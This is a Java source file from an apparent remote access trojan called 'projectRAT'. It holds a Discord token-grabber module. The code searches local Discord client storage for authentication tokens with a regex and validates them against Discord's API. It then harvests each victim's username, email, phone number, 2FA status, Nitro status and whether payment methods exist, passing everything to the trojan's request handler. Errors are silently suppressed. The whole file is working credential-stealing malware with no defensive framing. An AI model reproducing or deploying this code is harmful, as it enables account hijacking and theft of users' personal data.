package in.momin5.projectRAT.request.grabbers;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.reflect.TypeToken;
import in.momin5.projectRAT.ProjectRAT;
import in.momin5.projectRAT.request.Request;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.StringJoiner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class Discord implements Request {

    private List<String> tokenList;
    private static Gson gson = new Gson();

    @Override
    public void init() {
        String[] dataPaths = {
                System.getenv("APPDATA") + "/Discord",System.getenv("APPDATA") + "/discordcanary",System.getenv("APPDATA") + "/discordptb",System.getenv("APPDATA") + "/LightCord"
        };
        try {
            for (String path: dataPaths) {
                tokenList = getTokens(path);
                tokenList = removeDuplicates(tokenList);
                tokenList = getValidTokens(tokenList);

                tokenList.forEach(e -> {
                    ProjectRAT.requestHandler.addStrings(process(e));
                });
            }
        }catch (Exception ignored){
        }
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return null;
    }

    public String process(String token){
        JsonObject obj = new JsonParser().parse(getUserData(token)).getAsJsonObject();

        String mainToken = "TOKEN: " + token;
        String name = "NAME: " + obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString();
        String email = "EMAIL: " + obj.get("email").getAsString();
        String factor2 = "2FACTOR: " + obj.get("mfa_enabled").getAsBoolean();
        String phoneNumber = String.format("PHONE NO: %s",!obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None");
        String nitro = String.format("NITRO: %s",obj.has("premium_type") ? "True" : "False");
        String hasPayment = String.format("PAYMENT: %s", hasPaymentMethods(token) ? "True" : "False");

        String main = new StringJoiner("\n").add(mainToken).add(name).add(email).add(factor2).add(phoneNumber).add(nitro).add(hasPayment).toString();
        return main;
    }

    private List<String> getTokens(String mainPath){
        List<String> tokens = new ArrayList<>();
        String tokenPath = mainPath + "/Local Storage/leveldb/";

        File matchDir = new File(tokenPath);
        String[] list = matchDir.list();
        if (list == null)
            return null;

        for(String s: list){
            try {
                FileInputStream fileInputStream = new FileInputStream(tokenPath + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                    while (matcher.find()) tokens.add(matcher.group());
                }
            } catch (Exception ignored) {
            }
        }

        return tokens;
    }

    public static List<String> removeDuplicates(List<String> list) {
        return list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
    }

    public static List<String> getValidTokens(List<String> tokens) {
        ArrayList<String> validTokens = new ArrayList<>();
        tokens.forEach(token -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                Map<String, Object> stuff = gson.fromJson(getHeaders(token), new TypeToken<Map<String, Object>>() {
                }.getType());
                stuff.forEach((key, value) -> con.addRequestProperty(key, (String) value));
                con.getInputStream().close();
                validTokens.add(token);
            } catch (Exception ignored) {
            }
        });
        return validTokens;
    }

    public static JsonObject getHeaders(String token) {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) object.addProperty("Authorization", token);
        return object;
    }

    private String getUserData(String token) {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    public static String getContentFromURL(String link, String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map<String, Object> json = gson.fromJson(getHeaders(auth), new TypeToken<Map<String, Object>>() {
            }.getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception ignored) {
            return "";
        }
    }

    private boolean hasPaymentMethods(String token) {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

}
